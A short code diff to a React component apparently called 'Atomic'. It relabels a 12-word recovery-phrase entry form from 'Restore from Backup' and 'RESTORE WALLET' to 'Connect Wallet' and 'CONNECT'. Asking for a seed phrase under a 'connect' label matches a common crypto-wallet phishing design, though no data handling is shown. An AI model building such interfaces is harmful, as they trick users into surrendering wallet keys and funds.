@@ -43,7 +43,7 @@ const Atomic = ({ handleFinish }: { handleFinish: () => void }) => {
 				{/* Card */}
 				<div className="text-center">
 					<h1 className="text-2xl font-bold text-white mb-12">
-						Restore from Backup
+						Connect Wallet
 					</h1>
 
 					{/* Floating Label Input */}
@@ -74,7 +74,7 @@ const Atomic = ({ handleFinish }: { handleFinish: () => void }) => {
 							disabled={words.length !== 12}
 							className="w-fit border-2 border-blue-400 disabled:opacity-80 font-bold text-white rounded-full mb-6 px-12 py-6 bg-gradient-to-t from-[#272944] via-[#3D3086] to-[#039DDD] shadow-inner shadow-white/40 [box-shadow:inset_0_3px_6px_rgba(0,0,0,0.6),inset_0_-3px_6px_rgba(255,255,255,0.4)]"
 						>
-							RESTORE WALLET
+							CONNECT
 						</Button>
 						<p className="text-xs text-white/50">
 							Enter all 12 words to continue
